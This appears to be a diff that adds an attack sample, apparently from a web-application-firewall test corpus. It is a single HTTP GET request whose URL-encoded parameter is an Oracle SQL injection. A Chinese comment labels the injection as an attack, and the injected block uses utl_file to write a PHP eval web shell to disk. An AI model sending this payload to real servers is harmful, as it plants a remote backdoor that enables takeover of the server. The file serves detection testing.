@@ -1,0 +1,9 @@
+# SQL注入_GET_oracle_写入文件
+# 攻击者通过构造此sql语句，使用utl_file 包来打开文件，写入内容，刷新缓冲区并关闭文件
+GET /?id=declare%20isto_file%20utl_file.file_type%3B%20begin%20isto_file%20:=%20utl_file.fopen%28%27IST0_DIR%27%2C%20%27wjfwb.php%27%2C%20%27W%27%29%3B%20utl_file.put_line%28isto_file%2C%27%3C%3Fphp%20eval%28$_POST%5B%22pass%22%5D%29%3B%3F%3E%27%29%3B%20utl_file.fflush%28isto_file%29%3B%20utl_file.fclose%28isto_file%29%3B%20end%3B&bid=hd_tag_m8mv26gu HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv26gu
+RM-PRO-Token: 2dd6329b644d2b515b488e6957b5c21d
+RM-PRO-Time: 1742808618498
+User-Agent: curl/7.83.1
+
